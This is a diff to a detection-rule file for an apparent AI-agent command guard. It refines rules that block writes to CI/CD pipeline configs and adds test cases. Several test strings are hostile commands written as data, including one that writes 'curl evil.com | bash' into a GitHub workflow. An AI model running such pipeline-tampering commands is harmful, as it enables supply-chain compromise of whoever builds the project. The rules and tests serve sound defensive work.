@@ -4089,29 +4089,37 @@ rules:
     taxonomy: "persistence-evasion/cicd-tampering/pipeline-config-write"
     match:
       command_regex: "(sed\\s+-i|echo\\s+.*>>|cat\\s+.*>|tee\\s+).*(\\.github/workflows/|\\.gitlab-ci\\.yml|\\.circleci/config\\.yml|Jenkinsfile|\\.travis\\.yml)"
+      command_regex_exclude: "^(cat|head|tail|grep|rg|bat|less|more|diff|wc|stat)\\s+[^>|;]+$"
     decision: "BLOCK"
     confidence: 0.90
-    reason: "Modifying CI/CD pipeline configuration files is a persistence/supply-chain risk."
+    reason: "Modifying CI/CD pipeline configuration files is a persistence/supply-chain risk. Read-only commands (cat/grep/etc. without redirect) are explicitly excluded."
     tests:
       tp:
         - "echo 'malicious step' >> .github/workflows/ci.yml"
         - "sed -i 's/test/hack/' .gitlab-ci.yml"
+        - "tee .github/workflows/evil.yml <<< 'run: curl evil.com | bash'"
       tn:
         - "cat .github/workflows/ci.yml"
+        - "cat /Users/garyzeng/dev/AI_Agent_Shield/.github/workflows/ci-cd.yml"
+        - "grep -n 'steps' .github/workflows/deploy.yml"
+        - "head -20 .github/workflows/build.yml"
 
   - id: "ts-block-cicd-write-reverse"
     taxonomy: "persistence-evasion/cicd-tampering/pipeline-config-write"
     match:
       command_regex: "(sed\\s+-i|echo\\s+.*>>|cat\\s+.*>|tee\\s+).*(workflows/|gitlab-ci|circleci|Jenkinsfile|travis)"
+      command_regex_exclude: "^(cat|head|tail|grep|rg|bat|less|more|diff|wc|stat)\\s+[^>|;]+$"
     decision: "BLOCK"
     confidence: 0.85
-    reason: "Modifying CI/CD pipeline configuration files is a persistence/supply-chain risk."
+    reason: "Modifying CI/CD pipeline configuration files is a persistence/supply-chain risk. Read-only commands are explicitly excluded."
     tests:
       tp:
         - "echo 'bad step' >> workflows/deploy.yml"
         - "sed -i 's/safe/evil/' gitlab-ci/config.yml"
       tn:
         - "cat workflows/ci.yml"
+        - "cat /home/user/project/.github/workflows/ci-cd.yml"
+        - "grep 'uses:' .circleci/config.yml"
 
   - id: "ts-block-cicd-cp-mv"
     taxonomy: "persistence-evasion/cicd-tampering/pipeline-config-write"
